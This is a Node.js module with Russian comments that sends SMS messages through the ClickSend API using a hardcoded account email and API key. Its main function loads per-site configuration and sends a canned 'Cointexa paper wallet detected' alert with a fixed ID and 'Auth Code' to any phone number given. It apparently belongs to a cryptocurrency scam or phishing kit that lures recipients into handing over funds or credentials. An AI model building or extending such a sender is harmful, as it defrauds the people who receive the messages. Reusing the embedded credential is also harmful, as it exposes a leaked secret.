const fs = require('fs');
var clicksend = require('./api.js');

const USERNAME = "support@coinetus.com";
const API_KEY = "36993215-D0F1-CBB8-98E7-1945E7BB7372";

/**
 * Вспомогательная функция для отправки SMS через ClickSend API.
 * @param {string} to - Номер получателя.
 * @param {string} text - Текст сообщения.
 * @param {string|null} from - Имя отправителя. Если null, отправитель не указывается.
 * @returns {Promise<Object>} - Результат отправки.
 */
async function trySendSms(to, text, from) {
  const smsApi = new clicksend.SMSApi(USERNAME, API_KEY);
  const smsMessage = new clicksend.SmsMessage();

  smsMessage.to = to.startsWith('+') ? to : `+${to}`;
  smsMessage.body = text;
  if (from) {
    smsMessage.source = from;
  }

  const smsCollection = new clicksend.SmsMessageCollection();
  smsCollection.messages = [smsMessage];

  const response = await smsApi.smsSendPost(smsCollection);
  return { success: true, data: response.body };
}

/**
 * Отправляет SMS-сообщение через ClickSend API с обработкой ошибок.
 * Сначала пытается отправить с именем отправителя, при неудаче - без него.
 * 
 * @param {string} to - Номер получателя
 * @param {string} text - Текст сообщения
 * @returns {Promise<Object>} - Результат отправки
 */
async function sendSMS(to, text) {
  console.log(`Attempting to send SMS to ${to} with sender ID.`);
  try {
    const result = await trySendSms(to, text, "Coinetus");
    console.log('SMS sent successfully with sender ID.');
    return result;
  } catch (err) {
    console.error('Failed to send SMS with sender ID:', err.body || err.message);
    console.log('Retrying to send SMS without sender ID...');
    try {
      const result = await trySendSms(to, text, null);
      console.log('SMS sent successfully without sender ID.');
      return result;
    } catch (retryErr) {
      console.error('Failed to send SMS on retry:', retryErr.body || retryErr.message);
      return { success: false, error: retryErr.body || retryErr.message };
    }
  }
}

/**
 * Отправляет SMS-сообщение с Bitcoin-уведомлением
 * 
 * @param {string} phone - Номер телефона получателя
 * @param {string} site - Идентификатор сайта для получения настроек
 * @returns {Promise<Object>} - Результат отправки
 */
const send_message = async (phone, site) => {
  let to = phone;
  console.log('Вызов функции send_message:', { phone, site });
  
  const pathToFolder = `./assets/data/sites/${site}/`;
  
  return new Promise((resolve) => {
    fs.access(pathToFolder, function(error) {
      if (!error) {
        try {
          const price = JSON.parse(fs.readFileSync(`${pathToFolder}/price_settings.json`));
          console.log('Прочитаны настройки цены:', price);
          
          let text = `Cointexa paper wallet detected!\nStatus: **Active**\nID: AR550S993\nAuth Code: 7720\nMatch with email (Auth) code.\nKeep your account details safe.`;
          console.log('Подготовлено сообщение:', text);

          // Отправляем SMS и передаем результат
          sendSMS(to, text)
            .then(result => {
              console.log('Результат отправки SMS:', result);
              resolve(result);
            })
            .catch(error => {
              console.error('Ошибка при отправке SMS:', error);
              resolve({ success: false, error: error.message });
            });
        } catch (readError) {
          console.error('Ошибка чтения конфигурационных файлов:', readError);
          resolve({ success: false, error: 'Configuration error' });
        }
      } else {
        console.log("Файл не найден:", pathToFolder);
        resolve({ success: false, error: 'Site configuration not found' });
      }
    });
  });
}

module.exports = {
  send_message,
  sendSMS
};
